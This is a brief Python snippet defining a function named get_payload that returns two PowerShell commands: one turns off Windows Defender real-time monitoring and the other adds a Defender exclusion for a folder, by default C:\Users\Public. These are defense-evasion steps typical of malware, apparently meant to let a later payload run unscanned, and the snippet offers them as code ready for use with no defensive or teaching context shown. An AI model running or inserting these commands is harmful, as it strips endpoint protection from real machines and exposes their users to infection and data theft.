def get_payload(exclude_path="C:\\Users\\Public"):
    return [
        f"Set-MpPreference -DisableRealtimeMonitoring $true",
        f"Add-MpPreference -ExclusionPath '{exclude_path}'"
    ]
